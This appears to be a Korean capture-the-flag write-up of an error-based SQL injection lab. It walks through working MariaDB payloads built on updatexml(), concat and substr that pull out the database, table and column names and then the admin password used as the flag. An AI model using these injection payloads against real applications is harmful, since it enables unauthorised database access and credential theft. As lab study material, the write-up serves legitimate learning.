# Error-Based SQL Injection write-up

## 문제 설명
에러메시지를 이용해 데이터를 추출하는 Error-Based SQL Injection 문제이다.

## 페이지 구조 분석

<img width="684" height="187" alt="image" src="https://github.com/user-attachments/assets/26f5480b-8b8d-4bec-8958-cdb7b4887ed7" />

사용자 입력한 uid 값이 필터링 없이 SQL 문자열에 그대로 이어 붙이는 구조이다.
따라서 입력값을 조작하면 쿼리 구조를 변경할 수 있다.


## 에러 반응 보기
입력값에 `'`을 입력하니 에러가 발생되고, 에러 안에  MariaDB가 표시된다. 
즉 DBMS가 MariaDB임을 확인할 수 있다.

<img width="1555" height="112" alt="image" src="https://github.com/user-attachments/assets/509892a9-5b7d-46a1-97b7-9953c47691eb" />

## 데이터베이스 이름 추출
```php
'AND updatexml(1,concat(0x7e,(select database()),0x7e),1)-- -
```
`updatexml` 문법 오류로 데이터베이스를 찾을 수 있다.
(updatexml는 xml데이터를 수정 해주는 함수 이다. )

<img width="435" height="147" alt="image" src="https://github.com/user-attachments/assets/4848f9b3-0491-4702-84a2-3a58ef0784a8" />

## 테이블 이름 추출
```php
'AND updatexml(1,concat(0x7e,(select table_name
from information_schema.tables
where table_schema='users'
limit 0,1),0x7e),1)-- -
```
테이블도 문법 오류를 이용해서 찾을 수 있다.
MariaDB의 tables 정보는 `information_schema.tables`에 저장한다.
'limit'는 한 번에 하나의 결과만 반환하기 위함이다.

<img width="482" height="74" alt="image" src="https://github.com/user-attachments/assets/5bbc9b96-c968-4e53-a360-85d3aae091e6" />


## 컬럼 이름 추출
```php
'AND updatexml(1,concat(0x7e,(select column_name
from information_schema.columns
where table_schema='users'
and table_name='user'
limit 0,1),0x7e),1)-- -
```
columns의 정보는 `imformation_schema.columns에 저장한다.
limit 0,1 -> 1,1 -> 2,1 변경하면서 입력하면 3개의 컬럼을 찾을 수 있다.

<img width="390" height="71" alt="image" src="https://github.com/user-attachments/assets/e41dc601-daa6-4230-a4c5-66716465f250" />

<img width="384" height="44" alt="image" src="https://github.com/user-attachments/assets/d49fe719-3fcc-4603-9165-d63daa9c627b" />

<img width="422" height="64" alt="image" src="https://github.com/user-attachments/assets/b5d22999-3447-4cba-ac53-464ec69a74b1" />

## flag 추출
먼저 uid 값을 확인하였다.
```php
'AND updatexml(1,concat(0x7e,(select uid from user limit 0,1),0x7e),1)-- -
```
<img width="421" height="71" alt="image" src="https://github.com/user-attachments/assets/6b4849d0-daca-4355-910e-554b933f77f7" />

이후 admin 조건을 걸어서 upw를 추출하니 플래그가 나왔다.
```php
'AND updatexml(1,concat(0x7e,(select upw from user limit 0,1),0x7e),1)--
```-

<img width="749" height="69" alt="image" src="https://github.com/user-attachments/assets/8342491e-94e7-4d26-8714-65a02512fccd" />

하지만 에러 출력은 최대 약32자까지만 보여준다.

```php
'AND updatexml(1,concat(0x7e,(select substr(upw,1,30) from user where uid='admin'),0x7e),1)-- -
```
`substr`을 이용해서 1,30 -> 31,30 변경하여 이어 붙이기 한다.


## 배운점
- updatexml()을 이용해 에러 메시지로 데이터를 추출하는 방법을 익혔다.
- MariaDB의 구조 정보는 information_schema에 저장된다는 것을 알게 되었다.
- 데이터 추출은 항상 DB -> 테이블 -> 컬럼 -> 데이터 순으로 진행해야 한다는 점을 이해하였다.
- 에러 출력 길이 제한이 있을 경우 substr()를 이용해서 분할 추출이 가능하다




